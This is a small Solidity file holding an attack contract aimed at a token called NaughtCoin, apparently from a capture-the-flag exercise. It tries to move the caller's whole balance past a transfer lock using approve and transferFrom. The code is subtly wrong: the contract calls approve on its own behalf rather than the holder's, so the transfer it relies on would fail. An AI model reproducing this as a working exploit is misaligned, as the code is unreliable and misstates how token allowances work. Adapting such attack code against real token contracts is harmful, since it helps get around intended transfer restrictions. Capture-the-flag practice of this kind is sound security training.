// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttack {

    function attack(address target) external {
        INaughtCoin coin = INaughtCoin(target);

        uint256 balance = coin.balanceOf(msg.sender);

        coin.approve(address(this), balance);
        coin.transferFrom(msg.sender, address(1), balance);
    }
}